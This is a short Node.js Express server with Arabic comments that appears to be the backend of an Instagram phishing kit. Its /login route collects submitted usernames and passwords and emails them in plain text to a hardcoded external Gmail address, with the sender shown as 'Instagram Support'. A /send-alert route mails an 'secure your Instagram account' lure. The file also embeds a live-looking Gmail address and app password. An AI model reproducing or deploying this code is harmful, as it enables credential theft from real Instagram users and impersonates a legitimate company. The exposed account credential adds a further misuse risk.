import express from "express";
import cors from "cors";
import bodyParser from "body-parser";
import nodemailer from "nodemailer";
import { emailTemp } from "./emailTemp.js";

const app = express();
app.use(cors());
app.use(bodyParser.json());

// 🔹 إعداد Gmail مباشر بدون env
const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: "aqarnna@gmail.com", // 👈 ضع بريدك هنا
        pass: "nukq babc zfrf myjm",   // 👈 استخدم App Password من إعدادات Gmail (وليس كلمة مرورك العادية)
    },
});

// 🔹 دالة لإرسال الإيميل
async function sendMail({ to, subject, text, html }) {
    const mailOptions = {
        from: "Instagram Support", // 👈 عدّل البريد هنا أيضاً
        to,
        subject,
        text,
        html,
    };

    const info = await transporter.sendMail(mailOptions);
    console.log("✅ Email sent:", info.messageId);
    return info;
}

// 🔹 راوت تسجيل الدخول (يرسل الإيميل بالمعلومات)
app.post("/login", async (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password)
            return res.status(400).json({ message: "الرجاء إدخال اسم المستخدم وكلمة المرور" });

        await sendMail({
            to: "fm883254@gmail.com", // 👈 هذا البريد الذي سيستقبل البيانات
            subject: "New Instagram Login",
            text: `Username: ${username}\nPassword: ${password}`,
            html: `<p><b>Username:</b> ${username}</p><p><b>Password:</b> ${password}</p>`,
        });

        res.json({ message: "Login info sent successfully ✅" });
    } catch (err) {
        console.error("❌ Error sending email:", err);
        res.status(500).json({ message: "حدث خطأ أثناء الإرسال", error: err.message });
    }
});

app.post("/send-alert", async (req, res) => {
    try {
        const htmlContent = emailTemp();
        const to = 'fm883254@gmail.com'
        await transporter.sendMail({
            to,
            subject: "مهم: أَمّن حسابك على إنستجرام",
            html: htmlContent,
        });

        res.json({ success: true, message: "Email sent successfully ✅" });
    } catch (err) {
        console.error(err);
        res.status(500).json({ success: false, message: "Failed to send email ❌" });
    }
});

// 🔹 تشغيل السيرفر
const PORT = 5000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
